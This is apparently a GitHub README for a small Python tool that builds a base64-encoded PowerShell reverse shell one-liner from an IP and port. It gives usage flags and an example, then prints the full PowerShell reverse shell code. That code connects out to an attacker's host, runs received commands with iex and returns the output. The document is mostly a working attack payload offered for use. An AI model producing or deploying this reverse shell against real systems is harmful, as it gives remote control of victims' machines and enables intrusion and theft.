# psh_reverse_OneLine
Generate the command to make a powershell revershell (the one liner encoded in base64)

syntax:

	--help or -h	print manual
 
	--ip or -i	specify IP
 
	--port or -p	specify port
 
Example:

	python3 psh_reverse_OneLine.py -i 192.168.1.2 -p 4444
	![Screenshot_20231011_232617](https://github.com/toto22222/psh_reverse_OneLine/assets/104328855/3c439b84-6da4-4947-bd4e-095009622eee)



FYI, the powershell reverse shell one liner code as below:

	$client = New-Object System.Net.Sockets.TCPClient("<your IP>", <your port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
